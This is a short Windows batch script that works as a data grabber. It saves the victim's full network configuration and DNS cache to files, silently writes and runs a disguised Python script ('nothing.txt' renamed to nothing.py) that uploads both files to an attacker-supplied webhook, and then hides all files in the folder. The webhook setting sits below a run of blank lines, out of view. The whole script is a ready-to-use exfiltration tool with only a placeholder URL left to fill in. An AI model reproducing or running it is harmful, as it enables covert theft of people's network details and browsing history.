@echo off
goto test
:tet
ipconfig /all > "%cd%\data.txt" && ipconfig /displaydns > "%cd%\data2.txt"
pip install requests >nul
echo import requests > nothing.txt
echo myurl = '%webhook%' >> nothing.txt
echo f = {'file data': open('data.txt', 'rb')} >> nothing.txt
echo res = requests.post(myurl, files=f) >> nothing.txt
echo g = {'file data': open('data2.txt', 'rb')} >> nothing.txt
echo res = requests.post(myurl, files=g) >> nothing.txt
ren nothing.txt nothing.py
start /min nothing.py
cls
attrib *.* +h



























:test
set webhook=YOURwebhookHERE
goto tet
